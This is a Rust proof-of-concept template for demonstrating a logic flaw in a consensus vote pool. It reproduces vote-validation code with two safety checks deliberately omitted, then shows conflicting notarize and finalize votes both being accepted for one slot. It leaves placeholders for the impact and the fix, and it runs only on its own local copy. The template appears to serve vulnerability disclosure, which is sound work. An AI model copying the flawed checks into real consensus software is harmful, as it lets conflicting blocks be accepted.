// POC TEMPLATE — WORKING EXPLOIT SKELETON
// Copy this, modify for target, compile, run.
// Standard: rustc --edition 2021 poc.rs -o poc && ./poc

use std::collections::HashMap;

// ============================================================
// TARGET-SPECIFIC: Replace with actual vulnerable types
// ============================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum VoteType {
    Notarize,
    NotarizeFallback,
    Finalize,
    Skip,
    SkipFallback,
    Genesis,
}

#[derive(Debug)]
pub struct Vote {
    pub vtype: VoteType,
    pub block_id: u64,
    pub slot: u64,
}

impl Vote {
    pub fn notarize(slot: u64, block_id: u64) -> Self {
        Self { vtype: VoteType::Notarize, slot, block_id }
    }
    pub fn finalize(slot: u64) -> Self {
        Self { vtype: VoteType::Finalize, slot, block_id: 0 }
    }
    // Add other constructors as needed
}

// ============================================================
// VULNERABLE LOGIC (Copy EXACT from target source)
// ============================================================

const MAX_NOTAR_FALLBACK_ENTRIES: usize = 3;

struct SlotEntry {
    skip: bool,
    skip_fallback: bool,
    finalize: bool,
    genesis: Option<u64>,
    notar: Option<u64>,
    notar_fallback: Vec<u64>,
}

impl SlotEntry {
    fn new() -> Self {
        Self {
            skip: false,
            skip_fallback: false,
            finalize: false,
            genesis: None,
            notar: None,
            notar_fallback: Vec::new(),
        }
    }

    // VULNERABLE: Copy EXACT logic from target (e.g., vote_pool.rs)
    fn try_add_vote(&mut self, msg: &Vote) -> Result<(), &'static str> {
        match msg.vtype {
            VoteType::Skip => {
                if self.notar.is_some() || self.finalize || self.skip_fallback || self.genesis.is_some() {
                    return Err("Invalid");
                }
                if self.skip { return Err("Duplicate"); }
                self.skip = true;
                Ok(())
            }
            VoteType::SkipFallback => {
                if self.finalize || self.skip || self.genesis.is_some() {
                    return Err("Invalid");
                }
                if self.skip_fallback { return Err("Duplicate"); }
                self.skip_fallback = true;
                Ok(())
            }
            VoteType::Finalize => {
                // VULNERABLE: Missing check for self.notar.is_some()
                if self.skip || self.skip_fallback || !self.notar_fallback.is_empty() || self.genesis.is_some() {
                    return Err("Invalid");
                }
                if self.finalize { return Err("Duplicate"); }
                self.finalize = true;
                Ok(())
            }
            VoteType::Genesis => {
                if self.skip || self.skip_fallback || self.finalize || self.notar.is_some() || !self.notar_fallback.is_empty() {
                    return Err("Invalid");
                }
                let bid = msg.block_id;
                match self.genesis {
                    None => { self.genesis = Some(bid); Ok(()) }
                    Some(existing) => {
                        if existing == bid { Err("Duplicate") } else { Err("Invalid") }
                    }
                }
            }
            VoteType::Notarize => {
                // VULNERABLE: Missing check for self.finalize
                let bid = msg.block_id;
                if self.skip || self.genesis.is_some() || self.notar_fallback.contains(&bid) {
                    return Err("Invalid");
                }
                match self.notar {
                    None => { self.notar = Some(bid); Ok(()) }
                    Some(existing) => {
                        if existing == bid { Err("Duplicate") } else { Err("Invalid") }
                    }
                }
            }
            VoteType::NotarizeFallback => {
                let bid = msg.block_id;
                if self.notar_fallback.contains(&bid) { return Err("Duplicate"); }
                if self.finalize || self.genesis.is_some() || self.notar_fallback.len() >= MAX_NOTAR_FALLBACK_ENTRIES { return Err("Invalid"); }
                if let Some(existing) = self.notar {
                    if existing == bid { return Err("Invalid"); }
                }
                self.notar_fallback.push(bid);
                Ok(())
            }
        }
    }
}

struct VotePool {
    entries: HashMap<u64, SlotEntry>,
}

impl VotePool {
    fn new() -> Self { Self { entries: HashMap::new() } }
    fn try_add_vote(&mut self, msg: &Vote, slot: u64) -> Result<(), &'static str> {
        self.entries.entry(slot).or_insert_with(SlotEntry::new).try_add_vote(msg)
    }
}

// ============================================================
// EXPLOIT EXECUTION
// ============================================================

fn main() {
    println!("🔴 EXPLOIT POC: [VULNERABILITY NAME]");
    println!("====================================================");
    println!("Target: [TARGET SYSTEM]");
    println!("Vulnerable file: [FILE:LINE]");
    println!();
    
    const SLOT: u64 = 100;
    let mut pool = VotePool::new();
    
    // Attack parameters
    let block_a: u64 = 0xAA; // Different block
    let block_b: u64 = 0xBB; // Different block
    
    println!("🎯 Target: Slot {}", SLOT);
    println!("   Block A: 0x{:X}", block_a);
    println!("   Block B: 0x{:X}", block_b);
    println!();
    
    // ============================================================
    // ATTACK PHASES
    // ============================================================
    
    println!("🔴 PHASE 1: [Description]");
    let vote_1 = Vote::notarize(SLOT, block_a);
    match pool.try_add_vote(&vote_1, SLOT) {
        Ok(()) => println!("   ✅ Phase 1 ACCEPTED"),
        Err(e) => { println!("   ❌ Phase 1 REJECTED: {:?}", e); return; }
    }
    
    println!("\n🔴 PHASE 2: [Description]");
    let vote_2 = Vote::finalize(SLOT);
    match pool.try_add_vote(&vote_2, SLOT) {
        Ok(()) => println!("   ✅ Phase 2 ACCEPTED"),
        Err(e) => { println!("   ❌ Phase 2 REJECTED: {:?}", e); return; }
    }
    
    // ============================================================
    // VERIFICATION
    // ============================================================
    println!("\n💀 VERIFICATION: [IMPACT]");
    println!("=================================================");
    
    let entry = pool.entries.get(&100).unwrap();
    println!("Slot {} state:", SLOT);
    println!("  Notarize: {:?}", entry.notar.is_some());
    println!("  Finalize: {:?}", entry.finalize);
    
    if entry.notar.is_some() && entry.finalize {
        println!("\n💀💀💀 [IMPACT DESCRIPTION] 💀💀💀");
        println!("   Both Phase 1 and Phase 2 accepted!");
        println!("   Same slot ({}), different blocks", SLOT);
        println!("   Result: [FULL IMPACT]");
    } else {
        println!("   Attack failed - safety preserved");
    }
    
    // ============================================================
    // FIX DEMONSTRATION
    // ============================================================
    println!("\n\n🛡️  THE FIX:");
    println!("===================================");
    println!("In [Function] — add check: [EXACT FIX]");
    println!("In [Function] — add check: [EXACT FIX]");
}

// ============================================================
// COMPILE & RUN:
// rustc --edition 2021 poc.rs -o poc && ./poc
// ============================================================